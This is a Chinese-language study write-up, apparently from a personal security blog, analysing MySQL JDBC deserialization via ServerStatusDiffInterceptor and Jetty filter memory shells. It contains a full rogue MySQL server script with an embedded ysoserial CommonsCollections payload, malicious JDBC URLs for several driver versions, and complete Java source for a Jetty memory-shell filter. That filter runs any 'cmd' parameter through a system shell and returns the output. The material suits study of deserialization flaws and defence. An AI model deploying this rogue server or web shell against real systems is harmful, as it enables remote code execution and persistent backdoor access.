# MySQLJDBC反序列化漏洞分析

```java
当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE

————————————————
例题wp链接：https://blog.csdn.net/qq_62046696/article/details/130540893
```

之前只是在题目中见过并没仔细分析，这篇文章将进行一个系统的学习。

`依赖`

```java
 <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.13</version>
        </dependency>
```

`连接源码`

```java
Class.forName("com.mysql.jdbc.Driver");
        String jdbc_url = "jdbc:mysql://localhost:3309/test?characterEncoding=UTF-8&serverTimezone=Asia/Shanghai" +
                "&autoDeserialize=true" +
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        Connection con = DriverManager.getConnection(jdbc_url, "root", "123123");
```

## `漏洞分析`

在com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor中下断点，我们可以知道这个类是一个拦截器。在JDBC URL中设定属性`queryInterceptors`为`ServerStatusDiffInterceptor`时，执行查询语句会调用拦截器的`preProcess`和`postProcess`方法，进而调用`getObject()`方法。

![image-20231015195721473](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231015195721473.png)

```
连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询
所以也就会执行 preProcess和postProcess方法
```

通过看调用链也很明显发现，直接从查询拦截器，直接到了 preProcess 方法证明的前面的语句

![image-20231015195937885](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231015195937885.png)

以下是一个调用：

```java
com\mysql\cj\jdbc\interceptors\ServerStatusDiffInterceptor.class#preProcess
         ServerStatusDiffInterceptor#populateMapWithSessionStatusValues
                 com.mysql.cj.jdbc.util.ResultSetUtil#resultSetToMap  方法里面有getObject（1） 
```

![image-20231015200137477](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231015200137477.png)

![image-20231015200246266](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231015200246266.png)

看到这发现不是因为执行了 SHOW SESSION STATUS语句（最后发现是 set autocommit这个语句）

![image-20231015200445669](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231015200445669.png)

![image-20231015201230173](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231015201230173.png)

### `ResultSetImpl#getObject`

首先需要进行分析(内容有删减，只留下了BLOB的内容)

```java
public Object getObject(int columnIndex) throws SQLException {
        try {
            this.checkRowPos();
            this.checkColumnBounds(columnIndex);
            int columnIndexMinusOne = columnIndex - 1;//2-1=1
            if (this.thisRow.getNull(columnIndexMinusOne)) {
                return null;
            } else {
                Field field = this.columnDefinition.getFields()[columnIndexMinusOne];//这里是匹配第一列的内容类型
                switch (field.getMysqlType()) {
                  case BLOB:
                        if (!field.isBinary() && !field.isBlob()) {//如果数据类型是二进制 或者Blob进入else
                            return this.getBytes(columnIndex);
                        } else {
                            byte[] data = this.getBytes(columnIndex);//获得第一列的字节
                            if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
                                //如果autoDeserialize为false直接返回，看名字也能猜到是序列化有关类
                                return data;
                            } else {
                                Object obj = data;
                                //这里获得的是第二个字段的内容
                                if (data != null && data.length >= 2) {
                                    if (data[0] != -84 || data[1] != -19) {//这里是序列化的头，下面会介绍
                                        return this.getString(columnIndex);
                                    }

                                    try {
                                        ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
                                        //对data进行序列化
                                        ObjectInputStream objIn = new ObjectInputStream(bytesIn);
                                        obj = objIn.readObject();
                                        objIn.close();
                                        bytesIn.close();
```

payload中的`queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true`就很容易理解了，而其他版本目录有变，所以payload也有变。

调用链子为

```java

     com\mysql\cj\jdbc\interceptors\ServerStatusDiffInterceptor.class#preProcess
            ServerStatusDiffInterceptor#populateMapWithSessionStatusValues
                  com.mysql.cj.jdbc.util.ResultSetUtil#resultSetToMap  方法里面有getObject（1） 
                               ResultSetImpl#getObject
```

## 在mysql版本为  5.1.29

**一点要看的题外话：**看前面提到的5.x的手册，`detectCustomCollations`这个选项是从5.1.29开始的，经过代码比对，可以认为`detectCustomCollations`这个选项在5.1.29之前一直为true。

触发点在`com.mysql.jdbc.ConnectionImpl`的`buildCollationMapping`方法中：

```java
<dependencies>
    <!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java -->
    <dependency>
        <groupId>mysql</groupId>
        <artifactId>mysql-connector-java</artifactId>
        <version>5.1.29</version>
    </dependency>
</dependencies>
```

发现直接跑是跑不通了，看一下代码

发现com.mysql.cj  cj这个文件夹已经没了

```
变成了com.mysql.jdbc这个包
com\mysql\jdbc\interceptors\ServerStatusDiffInterceptor.class
```

![image-20231015204909530](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231015204909530.png)

可以看到这里有两个条件，服务器版本大于等于4.1.0，并且detectCustomCollations选项为true，然后获取SHOW COLLATION的结果后，服务器版本大于等于5.0.0才会进入到resultSetToMap方法触发反序列化





```java
    public ResultSetInternalMethods postProcess(String sql, Statement interceptedStatement, ResultSetInternalMethods originalResultSet, Connection connection) throws SQLException {
        //
        if (connection.versionMeetsMinimum(5, 0, 2)) {
            this.populateMapWithSessionStatusValues(connection, this.postExecuteValues);
            connection.getLog().logInfo("Server status change for statement:\n" + Util.calculateDifferences(this.preExecuteValues, this.postExecuteValues));
        }

        return null;
    }

    private void populateMapWithSessionStatusValues(Connection connection, Map<String, String> toPopulate) throws SQLException {
        java.sql.Statement stmt = null;
        ResultSet rs = null;

        try {
            toPopulate.clear();
            stmt = connection.createStatement();
            rs = stmt.executeQuery("SHOW SESSION STATUS");
            Util.resultSetToMap(toPopulate, rs);
        } finally {
            if (rs != null) {
                rs.close();
            }

            if (stmt != null) {
                stmt.close();
            }

        }

    }

    public ResultSetInternalMethods preProcess(String sql, Statement interceptedStatement, Connection connection) throws SQLException {
        if (connection.versionMeetsMinimum(5, 0, 2)) {
            this.populateMapWithSessionStatusValues(connection, this.preExecuteValues);
        }
```



## 这里是通过了一个恶意的mysql python服务器来实现的

```python
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > payload
    file= r'payload'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                #获取payload
                payload_content=get_payload_content()
                #计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                #计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3309

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

偷的脚本，里面的数字就是根据流量监控模拟真实的返回值

![image-20231015211631306](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231015211631306.png)

```
ServerStatusDiffInterceptor触发：

8.x:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

6.x(属性名不同):jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

5.1.11及以上的5.x版本（包名没有了cj）:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

5.1.10及以下的5.1.X版本：同上，但是需要连接后执行查询。

5.0.x:还没有ServerStatusDiffInterceptor这个东西┓( ´∀` )┏

detectCustomCollations触发：

5.1.41及以上:不可用

5.1.29-5.1.40:jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc

5.1.28-5.1.19：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc

5.1.18以下的5.1.x版本：不可用

5.0.x版本不可用
```

```
其实这一块在实际中用不到，毕竟哪一个网站会让你 mysql连接都可控呢，只有ctf题才有可能
```

## Jetty内存马

### 环境搭建

```java
Jetty是一个开源的servlet容器，其实和tomcat很详细，但它可以迅速为一些独立运行的java应用提供网络和web连接。
```

```java
<dependency>
        <groupId>org.eclipse.jetty</groupId>
        <artifactId>jetty-server</artifactId>
        <version>9.4.30.v20200611</version>
        <scope>provided</scope>
    </dependency>
```

本地搭建的时候一直不对，搭了好几天了，先看原理了~~~

### Filter分析

寻找第一个出现和filters相关信息的调用栈，可以快速定位获取上下文的内容。

![image-20231016190632327](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016190632327.png)

找到第一次调用`doFilter`的地方，ServletHandler::doHandle中第一次调用了doFilter,chain.doFilter().

考虑chain是如何生成的

![image-20231016190844559](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016190844559.png)

`ServletHandler::doHandle`中定义了`chain（FilterChain）类型`，接着调用了`getFilterChain`，跟进查看`getFilterChain`，该函数构造FilterChain。

![image-20231016191306880](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016191306880.png)

```java
下面是对filters进行了一个遍历（不对）
    应该是对_filterpathMappings进行了一个遍历从中获取元素中的_Holder（FilterHolder类型），然后把值存进filters中，应该就是把路径存了进去
```

![image-20231016191405896](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016191405896.png)

也就是获得的是filter自定义过滤器的名字

![image-20231016192104926](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192104926.png)

接着经过`new ServletHandler.CacheChain(filers,servletHolder)`，会将filters中的信息存入chain，然后返回chain。

![image-20231016192331663](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192331663.png)

继续往上跟进，观察`_filterPathMappings`如何生成的。观察调用栈可以发现，在第一次调用`ServletHandler`的时候，在实例化的`ServletHandler`对象中有`this._filterPathMappings`，那么可以理解为获取到`ServletHandler对象`就能获取到`_filterPathMappings`

![image-20231016192531539](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192531539.png)

所以如何将恶意filter注入的关键在于在`_filterPathMappings`中添加必要的元素。需要往filerPathMappings中添加FilterMapping类型的元素。根据经验，可以假设FilterMapping中需要包含如下三个变量。

![image-20231016192705153](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192705153.png)

![image-20231016192849489](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231016192849489.png)

```java
先写一下我的思路：其实可以发现递归啥的根源就是这个_filePathMappings，而_filePathMappings又是从ServletHandler中获得的，所以我们要先获取这个ServletHandler这个对象
```

`其他✌的思路`,基本相似

```java
1、获取ServletHandler
2、获取_filterPathMappings
3、往_filterPathMappings中添加元素FilterMapping的实例化对象
其中该实例化对象包含三个变量：分别是_filterName,_holder,_pathSpecs
```







## `10.16晚终于把环境搞定了通过从网上拔了一个项目，改吧改吧`

X:\jetty\code-servlet-parent(项目的路径)

参考这个连接：[使用maven-Jetty9-plugin插件运行第一个Servlet - 极客子羽 - 博客园 (cnblogs.com)](https://www.cnblogs.com/kendoziyu/p/first-servlet-project-using-maven-Jetty9-plugin.html)

又遇到一个问题，就是原代码没有下载下来，导致不能看源代码，直接pom.xml导致一个依赖

 ```java
 <dependency>
             <groupId>org.eclipse.jetty</groupId>
             <artifactId>jetty-server</artifactId>
             <version>9.4.33.v20201020</version>
             <scope>provided</scope>
         </dependency>
 ```

#### 直接在右边调试运行

![image-20231017155214571](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231017155214571.png)

然后先找一个能打通的文章细看

![image-20231017192704373](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231017192704373.png)

文章非常nice我都能看懂，就不生产垃圾了http://wjlshare.com/archives/1707

```java
import javax.servlet.*;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Map;

@SuppressWarnings("all")
public class JettyFilterMemShell implements Filter {

    Object request = null;
    Object response = null;
    boolean bool = false;
    String filterName = "evilFilter";
    String urlPattern = "/*";

    static {
        JettyFilterMemShell shell = new JettyFilterMemShell();
        try {
            shell.init();
            Object _scope = JettyFilterMemShell.getField(shell.request,"_scope");
            // 获取 ServletHandler 对象
            Object _servletHandler = JettyFilterMemShell.getField(_scope,"_servletHandler");

            Object[] _filters = (Object[]) JettyFilterMemShell.getField(_servletHandler,"_filters");
            // 判断 filter 是否已注入，如果已注入就不继续运行代码
            for (Object filter:_filters){
                String _name = (String) JettyFilterMemShell.getField(filter,"_name");
                if (_name.equals(shell.filterName)){
                    shell.bool = true;
                    break;
                }
            }

            if (!shell.bool){
                // 反射获取 FilterHolder 构造器并进行实例化
                Class filterHolderClas = _filters[0].getClass(); 
                Constructor filterHolderCons = filterHolderClas.getConstructor(javax.servlet.Filter.class);
                Object filterHolder = filterHolderCons.newInstance(shell); 了

                // 反射获取 FilterMapping 构造器并进行实例化
                Object[] _filtersMappings = (Object[]) JettyFilterMemShell.getField(_servletHandler,"_filterMappings");
                Class filterMappingClas = _filtersMappings[0].getClass(); 
                Constructor filterMappingCons = filterMappingClas.getConstructor();
                Object filterMapping = filterMappingCons.newInstance();

                // 反射赋值 filter 名
                Field _filterNameField = filterMappingClas.getDeclaredField("_filterName");
                _filterNameField.setAccessible(true);
                _filterNameField.set(filterMapping,shell.filterName);

                // 反射赋值 _holder
                Field _holderField = filterMappingClas.getDeclaredField("_holder");
                _holderField.setAccessible(true);
                _holderField.set(filterMapping,filterHolder);

                // 反射赋值 urlpattern
                Field _pathSpecsField = filterMappingClas.getDeclaredField("_pathSpecs");
                _pathSpecsField.setAccessible(true);
                _pathSpecsField.set(filterMapping,new String[]{shell.urlPattern});

                /**
                 * private final Map<String, FilterHolder> _filterNameMap = new HashMap();
                 *
                 *  at org.eclipse.jetty.servlet.ServletHandler.updateMappings(ServletHandler.java:1345)
                 *  at org.eclipse.jetty.servlet.ServletHandler.setFilterMappings(ServletHandler.java:1542)
                 *  at org.eclipse.jetty.servlet.ServletHandler.prependFilterMapping(ServletHandler.java:1242)
                 */

                // 属性带有 final 需要先反射修改 modifiers 才能编辑 final 变量
                Field _filterNameMapField = _servletHandler.getClass().getDeclaredField("_filterNameMap");
                _filterNameMapField.setAccessible(true);
                Field modifiersField = Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(_filterNameMapField,_filterNameMapField.getModifiers()& ~Modifier.FINAL);
                // 先把原来的取出来然后再放进去
                Map _filterNameMap = (Map) _filterNameMapField.get(_servletHandler);
                _filterNameMap.put(shell.filterName, filterHolder);
                _filterNameMapField.set(_servletHandler,_filterNameMap);
                                // 调用 prependFilterMapping 将 mapping 放到第一个
                Method prependFilterMappingMethod = _servletHandler.getClass().getDeclaredMethod("prependFilterMapping",filterMappingClas);
                prependFilterMappingMethod.setAccessible(true);
                prependFilterMappingMethod.invoke(_servletHandler,filterMapping);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void init() throws Exception{
        Class<?> clazz = Thread.currentThread().getClass();
        Field field = clazz.getDeclaredField("threadLocals");
        field.setAccessible(true);
        Object object = field.get(Thread.currentThread());
        field = object.getClass().getDeclaredField("table");
        field.setAccessible(true);
        object = field.get(object);
        Object[] arrayOfObject = (Object[])object;
        for (byte b = 0; b < arrayOfObject.length; b++) {
            Object object1 = arrayOfObject[b];
            if (object1 != null) {
                field = object1.getClass().getDeclaredField("value");
                field.setAccessible(true);
                object = field.get(object1);
                if (object != null && object.getClass().getName().endsWith("HttpConnection")) {
                    Method method = object.getClass().getDeclaredMethod("getHttpChannel", null);
                    Object object2 = method.invoke(object, null);
                    method = object2.getClass().getMethod("getRequest", null);
                    this.request =  method.invoke(object2, null);
                    method = this.request.getClass().getMethod("getResponse", null);
                    this.response =  method.invoke(this.request, null);
                    break;
                }
            }
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

        String cmd = servletRequest.getParameter("cmd");
        if(cmd != null && !cmd.isEmpty()){
            String[] cmds = null;
            if(File.separator.equals("/")){
                cmds = new String[]{"/bin/sh", "-c", cmd};
            }else{
                cmds = new String[]{"cmd", "/C", cmd};
            }

            Process process = Runtime.getRuntime().exec(cmds);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
    }

    public static Object getField(Object obj, String fieldName) throws Exception {
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }
}
```

![image-20231017201951005](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231017201951005.png)
